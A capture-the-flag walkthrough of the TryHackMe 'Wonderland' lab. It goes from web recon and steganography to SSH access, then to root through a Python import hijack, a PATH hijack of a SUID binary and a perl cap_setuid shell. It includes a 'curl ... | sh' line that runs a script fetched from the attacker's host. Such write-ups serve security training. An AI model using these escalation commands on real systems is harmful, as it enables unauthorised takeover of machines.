---
title: "Walk-through of Wonderland from TryHackMe"
header:
  teaser: /assets/images/2020-06-07-14-11-13.png
toc: true
toc_sticky: true
excerpt_separator:  <!--more-->
categories:
  - CTF
tags:
  - THM
  - CTF
  - gtfobins
  - gobuster
  - Linux
---

## Machine Information

![wonderland](/assets/images/2020-06-07-14-11-13.png)

Wonderland is a mid level room themed around Alice In Wonderland. Skills required are basic enumeration techniques of websites and Linux file systems. Skills learned are exploiting the lack absolute paths, and examining binaries to understand how they function.
<!--more-->

| Details |  |
| --- | --- |
| Hosting Site | [TryHackMe](https://tryhackme.com/) |
| Link To Machine | [THM - Medium - Wonderland](https://tryhackme.com/room/wonderland) |
| Machine Release Date | 5th June 2020 |
| Date I Completed It | 6th June 2020 |
| Distribution used | Kali 2020.1 – [Release Info](https://www.kali.org/releases/kali-linux-2020-1-release/) |

## Initial Recon

As always, let's start with Nmap to check for open ports:

```text
root@kali:~/thm/wonderland# ports=$(nmap -p- --min-rate=1000 -T4 10.10.159.58 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
root@kali:~/thm/wonderland# nmap -p$ports -v -sC -sV -oA wonderland 10.10.159.58
Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-05 21:43 BST
Scanning 10.10.159.58 [4 ports]
Completed Ping Scan at 21:43, 0.06s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 21:43
Completed Parallel DNS resolution of 1 host. at 21:43, 0.02s elapsed
Initiating SYN Stealth Scan at 21:43
Scanning 10.10.159.58 [2 ports]
Discovered open port 80/tcp on 10.10.159.58
Discovered open port 22/tcp on 10.10.159.58
Completed SYN Stealth Scan at 21:43, 0.06s elapsed (2 total ports)
Initiating Service scan at 21:43
Scanning 2 services on 10.10.159.58
Completed Service scan at 21:44, 11.36s elapsed (2 services on 1 host)
Nmap scan report for 10.10.159.58
Host is up (0.025s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 8e:ee:fb:96:ce:ad:70:dd:05:a9:3b:0d:b0:71:b8:63 (RSA)
|   256 7a:92:79:44:16:4f:20:43:50:a9:a8:47:e2:c2:be:84 (ECDSA)
|_  256 00:0b:80:44:e6:3d:4b:69:47:92:2c:55:14:7e:2a:c9 (ED25519)
80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Follow the white rabbit.

Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.99 seconds
           Raw packets sent: 6 (240B) | Rcvd: 3 (116B)
```

Just two ports open, let's have a look at the website first:

![follow_the_rabbit](/assets/images/2020-06-07-14-14-59.png)

Nothing on the page, but source shows path to picture is /img:

![page_source](/assets/images/2020-06-07-18-15-53.png)

Check if we can browse that directory:

![img_folder](/assets/images/2020-06-07-18-17-32.png)

JPGs are always suspicious in CTF, so let's grab the files and see if anything is hidden in them:

```text
root@kali:~/thm/wonderland# wget http://10.10.208.142/img/alice_door.jpg
--2020-06-07 18:19:45--  http://10.10.208.142/img/alice_door.jpg
Connecting to 10.10.208.142:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1556347 (1.5M) [image/jpeg]
Saving to: ‘alice_door.jpg’
alice_door.jpg                                             100%[=======================================================================================================================================>]   1.48M  3.24MB/s    in 0.5s
2020-06-07 18:19:45 (3.24 MB/s) - ‘alice_door.jpg’ saved [1556347/1556347]

root@kali:~/thm/wonderland# wget http://10.10.208.142/img/white_rabbit_1.jpg
--2020-06-07 18:20:06--  http://10.10.208.142/img/white_rabbit_1.jpg
Connecting to 10.10.208.142:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1993438 (1.9M) [image/jpeg]
Saving to: ‘white_rabbit_1.jpg’
white_rabbit_1.jpg                                         100%[=======================================================================================================================================>]   1.90M  1.61MB/s    in 1.2s
2020-06-07 18:20:07 (1.61 MB/s) - ‘white_rabbit_1.jpg’ saved [1993438/1993438]
```

We can use steghide to extract and hidden files if they haven't got a password:

```text
root@kali:~/thm/wonderland# steghide extract -sf alice_door.jpg
Enter passphrase:
steghide: could not extract any data with that passphrase!

root@kali:~/thm/wonderland# steghide extract -sf white_rabbit_1.jpg
Enter passphrase:
wrote extracted data to "hint.txt".
```

Nothing in the first one, but the second has a text file, let have a look:

```text
root@kali:~/thm/wonderland# cat hint.txt
follow the r a b b i t
```

Interesting, with nothing else obvious to look at on the website, let's try gobuster:

```text
root@kali:~/thm/wonderland# gobuster -t 100 dir -e -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.159.58
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.159.58
[+] Threads:        100
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Expanded:       true
[+] Timeout:        10s
===============================================================
2020/06/05 21:46:13 Starting gobuster
===============================================================
http://10.10.159.58/img (Status: 301)
http://10.10.159.58/r (Status: 301)
http://10.10.159.58/poem (Status: 301)
===============================================================
2020/06/05 21:49:08 Finished
===============================================================
```

We've looked in img already, let's try poem:

![jabberwocky](/assets/images/2020-06-07-18-26-46.png)

It's the nonsense poem from the Story, but nothing else there. Try the other folder:

![keep_going](/assets/images/2020-06-07-18-29-41.png)

Another hint, and that from the text file suggests we traverse folders spelt rabbit:

![alice](/assets/images/2020-06-07-18-34-06.png)

Finally we get to the end, nothing on the page, let's check the source:

![alice_source](/assets/images/2020-06-07-18-35-32.png)

## Gaining Access

A hidden username and password, looks like it's time to try ssh on port 22:

```text
root@kali:~/thm/wonderland# ssh alice@10.10.217.24
The authenticity of host '10.10.217.24 (10.10.217.24)' can't be established.
ECDSA key fingerprint is SHA256:HUoT05UWCcf3WRhR5kF7yKX1yqUvNhjqtxuUMyOeqR8.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.217.24' (ECDSA) to the list of known hosts.
alice@10.10.217.24's password:
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-101-generic x86_64)
Last login: Mon May 25 16:37:21 2020 from 192.168.170.1
```

We're in, let's look around:

```text
alice@wonderland:~$ ls -l
4 -rw------- 1 root  root    66 May 25 17:08 root.txt
4 -rw-r--r-- 1 root  root  3577 May 25 02:43 walrus_and_the_carpenter.py
```

Root flag is in user folder, but we don't have permissions for view it:

```text
alice@wonderland:~$ cat root.txt
cat: root.txt: Permission denied
```

## User Flag

My first thought was I wonder if the user flag is in the root folder:

```text
alice@wonderland:~$ ls /root/user.txt
/root/user.txt
alice@wonderland:~$ cat /root/user.txt
<<HIDDEN>>
```

That was a lucky guess. Let's check the other file in here:

```text
alice@wonderland:~$ cat walrus_and_the_carpenter.py
import random
poem = """The sun was shining on the sea,
Shining with all his might:
He did his very best to make
The billows smooth and bright —
And this was odd, because it was
The middle of the night.

<SNIP>

"O Oysters," said the Carpenter.
"You’ve had a pleasant run!
Shall we be trotting home again?"
But answer came there none —
And that was scarcely odd, because
They’d eaten every one."""

for i in range(10):
    line = random.choice(poem.split("\n"))
    print("The line was:\t", line)alice@wonderland:~$
```

This file seems to contain a long list of text from the story wrapped by some python to randomly pick a few lines and print them out. Let's try it:

```text
alice@wonderland:~$ python3 walrus_and_the_carpenter.py
The line was:    No birds were flying over head —
The line was:    For some of us are out of breath,
The line was:    And you are very nice!"
The line was:    Their coats were brushed, their faces washed,
The line was:    And you are very nice!"
The line was:    "If this were only cleared away,"
The line was:    They thanked him much for that.
```

I notice the file doesn't have an absolute path for the first line where it imports the python module **random**. We can exploit this, and force it to load our own file instead.

We need to find a way to use this to escalate our privileges. Check users permissions:

```text
alice@wonderland:~$ sudo -l
[sudo] password for alice:
Matching Defaults entries for alice on wonderland:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User alice may run the following commands on wonderland:
    (rabbit) /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
```

Looks like our path is to exploit the walrus python script and run it as the rabbit user to get a shell. First we create our own file that will get run by the script:

```text
alice@wonderland:~$ cat random.py
import os
os.system("/bin/bash")
```

## Privilege Escalation

Now we run the script as the rabbit user:

```text
alice@wonderland:~$ sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
rabbit@wonderland:~$ sh
```

We now have a shell as rabbit, lets look in their home folder:

```text
rabbit@wonderland:~$ ls -l /home/rabbit/
total 20
-rwsr-sr-x 1 root root 16816 May 25 17:58 teaParty
```

We have a file that is owned by root, but readable by rabbit. Looks like we have another level of escalation needed. Let's see what it does:

```text
rabbit@wonderland:~$ cd /home/rabbit/
rabbit@wonderland:/home/rabbit$ ./teaParty
Welcome to the tea party!
The Mad Hatter will be here soon.
Probably by Sun, 07 Jun 2020 19:07:36 +0000
Ask very nicely, and I will give you some tea while you wait for him
please
Segmentation fault (core dumped)
```

We get a seg fault with any response, so probably not a buffer overflow required, but maybe something else. Let's get the file to our Kali box and have a look at it.

There's python on this box so let's use that to start a HTTP server and grab the file:

```text
rabbit@wonderland:/home/rabbit$ python3.6 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

Over on Kali:

```text
root@kali:~/thm/wonderland# wget http://10.10.208.142:8000/teaParty
--2020-06-07 19:47:26--  http://10.10.208.142:8000/teaParty
Connecting to 10.10.208.142:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 16816 (16K) [application/octet-stream]
Saving to: ‘teaParty’
teaParty                                                   100%[=======================================================================================================================================>]  16.42K  --.-KB/s    in 0.04s
2020-06-07 19:47:26 (466 KB/s) - ‘teaParty’ saved [16816/16816]
```

Let's have a look at it:

```text
root@kali:~/thm/wonderland# file teaParty
teaParty: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=75a832557e341d3f65157c22fafd6d6ed7413474, not stripped

root@kali:~/thm/wonderland# checksec --file=teaParty
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable  FILE
Partial RELRO   No canary found   NX enabled    PIE enabled     No RPATH   No RUNPATH   68 Symbols     No       0               0       teaParty

root@kali:~/thm/wonderland# strings teaParty | awk 'length($0) > 10'
/lib64/ld-linux-x86-64.so.2
__cxa_finalize
__libc_start_main
GLIBC_2.2.5
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
Welcome to the tea party!
The Mad Hatter will be here soon.
/bin/echo -n 'Probably by ' && date --date='next hour' -R
Ask very nicely, and I will give you some tea while you wait for him
Segmentation fault (core dumped)
GCC: (Debian 8.3.0-6) 8.3.0
deregister_tm_clones
<SNIP>
```

The interesting line from the strings output is:

```text
/bin/echo -n 'Probably by ' && date --date='next hour' -R
```

We can see date is being executed without an absolute path, so we can use the same technique as before and force our own file to be executed instead. Create our own date file and make it executable:

```text
rabbit@wonderland:/home/rabbit$ cat date
#!/bin/bash
/bin/bash

rabbit@wonderland:/home/rabbit$ chmod +x date

rabbit@wonderland:/home/rabbit$ ls -l
total 24
-rwxr-xr-x 1 rabbit rabbit    23 Jun  7 19:05 date
-rwsr-sr-x 1 root   root   16816 May 25 17:58 teaParty
```

Now add our folder to the path:

```text
rabbit@wonderland:/home/rabbit$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin

rabbit@wonderland:/home/rabbit$ export PATH=/home/rabbit:$PATH

rabbit@wonderland:/home/rabbit$ echo $PATH
/home/rabbit:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin
```

Now run the binary:

```text
rabbit@wonderland:/home/rabbit$ ./teaParty
Welcome to the tea party!
The Mad Hatter will be here soon.
Probably by hatter@wonderland:/home/rabbit$
```

Excellent, that worked and we are now the user hatter. Have a look around:

```text
Probably by hatter@wonderland:/home/rabbit$ id
uid=1003(hatter) gid=1002(rabbit) groups=1002(rabbit)

hatter@wonderland:/home/rabbit$ cd /home/hatter

hatter@wonderland:/home/hatter$ ls
password.txt

hatter@wonderland:/home/hatter$ cat password.txt
<<HIDDEN>>
```

We have a password, assuming this is for hatter so we can ssh on without having to escalate:

```text
root@kali:~/thm/wonderland# ssh hatter@10.10.208.142
hatter@10.10.208.142's password:

Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-101-generic x86_64)
The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

hatter@wonderland:~$ id
uid=1003(hatter) gid=1003(hatter) groups=1003(hatter)
```

I had a look around but nothing obvious jumped out, so used LinEnum to see what it can find:

```text
root@kali:~/thm/wonderland# wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
--2020-06-06 17:49:48--  https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 199.232.56.133
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|199.232.56.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 46631 (46K) [text/plain]
Saving to: ‘LinEnum.sh’
LinEnum.sh                                                 100%[=======================================================================================================================================>]  45.54K  --.-KB/s    in 0.03s
2020-06-06 17:49:48 (1.43 MB/s) - ‘LinEnum.sh’ saved [46631/46631]

root@kali:~/thm/wonderland# python -m SimpleHTTPServer 8000
Serving HTTP on 0.0.0.0 port 8000 ...
```

Script downloaded, now switch to box to pull it across from Kali:

```text
hatter@wonderland:~$ curl http://10.9.17.195:8000/LinEnum.sh | sh
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 46631  100 46631    0     0   263k      0 --:--:-- --:--:-- --:--:--  263k
#########################################################
# Local Linux Enumeration & Privilege Escalation Script #
#########################################################
# www.rebootuser.com
# version 0.982
[-] Debug Info
[+] Thorough tests = Disabled
Scan started at:
Sat Jun  6 16:58:23 UTC 2020

### SYSTEM ##############################################
[-] Kernel information:
Linux wonderland 4.15.0-101-generic #102-Ubuntu SMP Mon May 11 10:07:26 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
[-] Kernel information (continued):
Linux version 4.15.0-101-generic (buildd@lgw01-amd64-003) (gcc version 7.5.0 (Ubuntu 7.5.0-3ubuntu1~18.04)) #102-Ubuntu SMP Mon May 11 10:07:26 UTC 2020
[-] Specific release information:
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=18.04
DISTRIB_CODENAME=bionic
DISTRIB_DESCRIPTION="Ubuntu 18.04.4 LTS"
NAME="Ubuntu"
VERSION="18.04.4 LTS (Bionic Beaver)"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 18.04.4 LTS"
VERSION_ID="18.04"
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
VERSION_CODENAME=bionic
UBUNTU_CODENAME=bionic
[-] Hostname:
wonderland

### USER/GROUP ##########################################
[-] Current user/group info:
uid=1003(hatter) gid=1003(hatter) groups=1003(hatter)
[-] Users that have previously logged onto the system:
Username         Port     From             Latest
tryhackme        pts/0    10.8.6.110       Fri Jun  5 22:28:57 +0000 2020
alice            pts/1    192.168.170.1    Mon May 25 16:37:21 +0000 2020
hatter           pts/0    10.9.17.195      Sat Jun  6 16:55:03 +0000 2020
[-] Who else is logged on:
 16:58:23 up 5 min,  1 user,  load average: 1.46, 1.72, 0.84
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
hatter   pts/0    10.9.17.195      16:55    7.00s  0.74s  0.08s w

<<SNIP>>

e [+] Files with POSIX capabilities set:
/usr/bin/perl5.26.1 = cap_setuid+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/perl = cap_setuid+ep
```

## Root Flag

Capabilities is a well known attack vector. [GTFOBins](https://gtfobins.github.io/gtfobins/) has lots of really good information about the many UNIX/Linux binaries that can be abused. [This](https://gtfobins.github.io/gtfobins/perl) section talks about Perl and what you can do with CAP_SETUID being set.

From that article iI took this command:

```text
./perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
```

Here we run it on the box to get root, and finally the flag:

```text
hatter@wonderland:~$ perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
# id
uid=0(root) gid=1003(hatter) groups=1003(hatter)

# cat /home/alice/root.txt
thm{Twinkle, twinkle, little bat! How I wonder what you’re at!}
```

All done. See you next time.
